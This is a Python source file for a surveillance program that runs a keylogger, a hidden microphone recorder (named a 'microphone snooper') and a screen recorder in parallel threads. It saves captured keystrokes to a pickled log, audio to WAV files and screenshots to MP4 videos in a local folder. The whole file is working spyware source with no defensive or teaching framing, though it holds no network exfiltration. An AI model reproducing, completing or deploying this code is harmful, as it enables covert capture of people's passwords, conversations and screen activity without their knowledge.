import time, sounddevice, os, pickle, glob, moviepy.video.io.ImageSequenceClip

from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
from PIL import ImageGrab
from threading import Thread

main_path = os.path.dirname(os.path.realpath(__file__))

CLEAR_LOGS = True
CLEAN_UP = True
KEYLOGGER_ENABLED = True
MICROPHONE_SNOOPER_ENABLED = True
SCREEN_RECORDER_ENABLED = True

INPUT_UPDATE_INTERVAL = 10
TIME_UPDATE_INTERVAL = 50
MIC_SAMPLERATE = 44100
RECORDER_FRAME_LIMIT = 10
FPS = 2

PATH = main_path + r"\\resources\\"
TEMP = PATH + r"temp\\"
RECORDINGS = PATH + r"recordings\\"

run = True
count = 0
keys = []

current_time = time.time()
stopping_time = time.time() + TIME_UPDATE_INTERVAL

audio_information = "microphone.wav"
screen_name = "screen"
image_file_extension = ".png"

def clean_up():
    files = glob.glob(TEMP+"*")
    for f in files:
        os.remove(f)

#KEYLOGGER #################################################################################################
def clear_logs():
    logs = ""
    main_path = os.path.dirname(os.path.realpath(__file__))

    TEMP_PATH = f"{main_path}/resources/"
    with open(f"{TEMP_PATH}/log.txt", "wb") as f:
        pickle.dump(logs, f)  

def on_press(key):
    global keys, count, current_time

    current_time = time.time()
    keys.append(key)
    count += 1
    if count > INPUT_UPDATE_INTERVAL:
        write_file(keys)
        count = 0   
        keys = []

def write_file(keys):
    with open(f'{PATH}/log.txt', 'rb') as f:
        logs = pickle.load(f)

    for key in keys:
        k = str(key).replace("'","")                   
        if k.find("space") > 0:
            logs = logs + " "
        elif k.find("Key") == -1:
            logs = logs + k
    print(logs)
    with open(f"{PATH}/log.txt", "wb") as f:
        pickle.dump(logs, f)  
    logs = []
    
def on_release(key):
    if key == Key.esc:      
        return False
    if current_time > stopping_time:
        return False

def keylogger():
    run = True
    while run:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

#KEYLOGGER #################################################################################################

def microphone_snooper():
    global stopping_time, TIME_UPDATE_INTERVAL
    run = True
    while run:
        current_time = time.time()
        if current_time > stopping_time:
            current_time = time.time()
            stopping_time = time.time() + TIME_UPDATE_INTERVAL
            fs = MIC_SAMPLERATE
            seconds = TIME_UPDATE_INTERVAL
            myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
            sounddevice.wait()
            write(PATH + audio_information, fs, myrecording)

def screen_recorder():
    global TIME_UPDATE_INTERVAL, FPS
    run = True

    frame_buffer = []
    frame_count = 0
    mov_count = 0
    while run:
        frame = ImageGrab.grab()
        frame_count += 1
        frame.save(TEMP + screen_name+str(frame_count)+image_file_extension)

        if frame_count > RECORDER_FRAME_LIMIT:
            image_files = [TEMP+img for img in os.listdir(TEMP) if img.endswith(".png")]
            clip = moviepy.video.io.ImageSequenceClip.ImageSequenceClip(image_files, fps=int(FPS))
            clip.write_videofile(f"{PATH}screen{mov_count}.mp4")
            mov_count += 1
            frame_count = 0
            clean_up()

if CLEAN_UP:
    clean_up()
if CLEAR_LOGS:
    clear_logs()

if __name__ == '__main__':
    if KEYLOGGER_ENABLED:
        Thread(target = keylogger).start()
    if MICROPHONE_SNOOPER_ENABLED:
        Thread(target = microphone_snooper).start()
    if SCREEN_RECORDER_ENABLED:
        Thread(target = screen_recorder).start()
